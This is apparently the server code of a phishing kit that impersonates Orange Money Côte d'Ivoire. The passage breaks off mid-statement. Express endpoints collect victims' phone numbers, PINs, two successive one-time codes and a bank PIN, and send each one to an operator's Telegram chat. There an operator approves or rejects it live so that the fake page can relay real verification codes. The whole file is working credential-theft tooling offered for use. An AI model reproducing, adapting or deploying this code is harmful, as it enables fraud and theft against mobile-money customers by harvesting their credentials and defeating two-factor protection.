const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Côte d'Ivoire";
    const countryCode = "+225";

    const currentTime = new Date().toLocaleString('fr-FR', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>ORANGE MONEY CÔTE D'IVOIRE - LOGIN ATTEMPT</b>

🆕 <b>NOUVEL UTILISATEUR</b>
🇨🇮 <b>Pays:</b> ${country}
🌍 <b>Indicatif:</b> ${countryCode}
📱 <b>Numéro de téléphone:</b> ${phone}
🔢 <b>Code PIN:</b> ${pin}
⏰ <b>Heure:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Utilisateur en attente de validation</b>
⌛ <b>Délai d'expiration: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Autoriser", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Identifiants invalides", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API (VERIFICATION CODE) --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Côte d'Ivoire";
    const countryCode = "+225";
    const currentTime = new Date().toLocaleString('fr-FR', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🆕 <b>ORANGE MONEY CÔTE D'IVOIRE - VERIFICATION REQUISE</b>
🇨🇮 <b>Pays:</b> ${country}
📞 <b>Indicatif:</b> ${countryCode}
📱 <b>Numéro de téléphone:</b> ${phone}
🔑 <b>CODE DE VÉRIFICATION (MAX IT):</b> <code>${code}</code>
⏰ <b>Heure:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Vérifiez les identifiants:</b>
⏰ <b>Délai d'expiration: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Code incorrect", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ PIN incorrect", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Contactez-nous", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Côte d'Ivoire";
    const countryCode = "+225";
    const currentTime = new Date().toLocaleString('fr-FR', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>ORANGE MONEY CÔTE D'IVOIRE - SECOND OTP (Étape 2/2)</b>

🆕 <b>NOUVEL UTILISATEUR - SECONDE VÉRIFICATION</b>
🇨🇮 <b>Pays:</b> ${country}
🌍 <b>Indicatif:</b> ${countryCode}
📱 <b>Numéro de téléphone:</b> ${phone}
🔐 <b>Second Code OTP:</b> ${otp}
⏰ <b>Heure:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Vérification du SECOND OTP:</b>
⌛ <b>Délai d'expiration: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Code incorrect", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 PIN incorrect", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>RENVOI DE CODE DEMANDÉ</b>

📱 <b>Numéro de téléphone:</b> ${phone}
📍 <b>Étape:</b> ${step}
⚠️ <b>L'utilisateur attend un nouveau code.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Côte d'Ivoire";
    const currentTime = new Date().toLocaleString('fr-FR', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>ORANGE MONEY CÔTE D'IVOIRE - CODE PIN BANCAIRE (Étape 3)</b>

🆕 <b>NOUVEL UTILISATEUR - SÉCURITÉ BANCAIRE</b>
🇨🇮 <b>Pays:</b> ${country}
📱 <b>Numéro de téléphone:</b> ${phone}
🔑 <b>Code PIN Bancaire:</b> ${bankPin}
⏰ <b>Heure:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Vérification du CODE BANCAIRE:</b>
⌛ <b>Délai d'expiration: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ PIN incorrect", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('fr-FR', { hour: 'numeric', minute: 'numeric', second: 'numeric' });

    const approvedMsg = `✅ <b>CONNEXION APPROUVÉE</b>

🆕 <b>NOUVEL UTILISATEUR</b>
🇨🇮 <b>Côte d'Ivoire</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Statut: Approuvé</b>
➡️ <b>Étape suivante: Premier OTP (1/2)</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Autorisé");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

// DENY
bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('fr-FR', { hour: 'numeric', minute: 'numeric', second: 'numeric' });

    const deniedMsg = `❌ <b>IDENTIFIANTS INVALIDES</b>

🇨🇮 <b>Côte d'Ivoire</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Statut: Refusé</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Refusé");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

// OTP1 CORRECT
bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('fr-FR', { hour: 'numeric', minute: 'numeric', second: 'numeric' });

    const verifiedMsg = `1️⃣ <b>PREMIER OTP VÉRIFIÉ (Étape 1/2)</b>

🇨🇮 <b>Côte d'Ivoire</b>
📱 <b>${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Statut: Premier OTP vérifié</b>
➡️ <b>Étape suivante: Second OTP (2/2) en cours d'envoi</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Vérifié");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

// OTP1 WRONG
bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Code incorrect");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PREMIER OTP INCORRECT</b>\n📱 <b>Utilisateur:</b> ${phone}\n⚠️ <b>Invité à ressaisir le code.</b>`);
});

// CONTACT US
bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("Contact demandé");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>DEMANDE DE CONTACT</b>\n📱 <b>Utilisateur:</b> ${phone}\n⚠️ <b>L'utilisateur a demandé l'aide du support.</b>`);
});

// OTP2 CORRECT
bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('fr-FR', { hour: 'numeric', minute: 'numeric', second: 'numeric' });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VÉRIFIÉ (Étape 2/2)</b>

🇨🇮 <b>Côte d'Ivoire</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Statut: Second OTP vérifié</b>
✅ <b>Procédure terminée</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Finalisé");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

// OTP2 WRONG
bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Code incorrect");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND OTP INCORRECT</b>\n📱 <b>Utilisateur:</b> ${phone}\n⚠️ <b>Invité à ressaisir le code.</b>`);
});

// BANK PIN CORRECT
bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>PIN BANCAIRE VÉRIFIÉ</b>

🇨🇮 <b>Côte d'Ivoire</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Statut: Procédure Terminée</b>
🏁 <b>Utilisateur redirigé vers la page de succès</b>`;

    await ctx.answerCbQuery("PIN Bancaire Vérifié");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

// BANK PIN WRONG
bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("PIN Bancaire incorrect");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PIN BANCAIRE INCORRECT</b>\n📱 <b>Utilisateur:</b> ${phone}\n⚠️ <b>Invité à ressaisir son PIN bancaire.</b>`);
});

// OTP2 WRONG PIN
bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("PIN incorrect");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>PIN INCORRECT SIGNALÉ</b>\n📱 <b>Utilisateur:</b> ${phone}\n⚠️ <b>Invité à re-saisir son PIN.</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status
